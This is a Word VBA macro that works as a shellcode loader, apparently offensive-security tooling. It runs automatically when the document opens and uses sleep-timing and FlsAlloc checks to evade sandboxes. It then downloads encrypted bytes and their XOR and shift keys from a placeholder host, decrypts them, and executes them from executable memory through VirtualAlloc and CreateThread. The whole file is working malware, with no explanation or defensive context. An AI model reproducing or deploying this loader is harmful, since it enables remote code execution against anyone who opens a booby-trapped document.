Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal callback As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Function GetValue(url As String) As Integer
    Dim value As Integer
    Dim request As Object
    Set request = CreateObject("MSXML2.XMLHTTP")
    
    ' Define our request object properties
    request.Open "GET", url, False
    request.send
    
    ' Process the data if the web request is valid
    If request.Status = 200 Then
        value = CInt(request.responseText)
    End If
    
    Set request = Nothing
    GetValue = value
End Function

Function GetArrayValue(url As String) As Variant
    Dim buf() As String
    Dim request As Object
    Set request = CreateObject("MSXML2.XMLHTTP")

    ' Define our request object properties
    request.Open "GET", url, False
    request.send
    
    ' Process the data if the web request is valid
    If request.Status = 200 Then
        buf = Split(request.responseText, ",")
        ' Convert each element to an integer
        Dim i As Integer
        For i = LBound(buf) To UBound(buf)
            buf(i) = CInt(buf(i))
        Next i
    End If
    
    Set request = Nothing
    GetArrayValue = buf
End Function

Function MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim xKey As Integer
    Dim sKey As Integer
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Function
    End If
    
    fls = FlsAlloc(0)
    If IsNull(fls) Then
        End
    End If
 
    ' Encrypted Bytes
    ' EX: 243,231,14,255
    buf = GetArrayValue("http://192.168.X.X/buf.txt")
    
    ' XOR Key
    ' EX: 70
    xKey = GetValue("http://192.168.X.X/xKey.txt")

    ' Shift Key
    ' EX: 185
    sKey = GetValue("http://192.168.X.X/sKey.txt")

    ' Decrypt XOR then shift to the left (-) as long as it's the opposite of what you shifted to start
    For i = 0 To UBound(buf)
        buf(i) = (buf(i) Xor xKey) - sKey
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
 
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
